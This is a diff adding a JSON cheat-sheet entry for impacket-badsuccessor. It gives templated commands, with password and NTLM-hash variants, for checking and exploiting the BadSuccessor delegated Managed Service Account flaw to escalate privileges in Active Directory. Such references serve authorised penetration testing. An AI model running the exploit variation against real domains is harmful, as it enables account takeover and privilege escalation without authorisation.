@@ -1,0 +1,35 @@
+{
+  "id": "impacket-badsuccessor",
+  "name": "Impacket badsuccessor",
+  "command": "impacket-badsuccessor -action check '<domain>/<user>:<password>' -dc-ip '<ip>'",
+  "description": "Exploit the BadSuccessor vulnerability to escalate privileges via delegated Managed Service Accounts (dMSA)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "impacket",
+    "badsuccessor",
+    "dmsa",
+    "privilege-escalation",
+    "acl"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-badsuccessor -action check -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>'"
+    },
+    {
+      "label": "Exploit (create dMSA)",
+      "requires": "password",
+      "command": "impacket-badsuccessor -action exploit -target-account '<target_user>' '<domain>/<user>:<password>' -dc-ip '<ip>'"
+    }
+  ],
+  "examples": [
+    "impacket-badsuccessor -action check 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
+  ]
+}
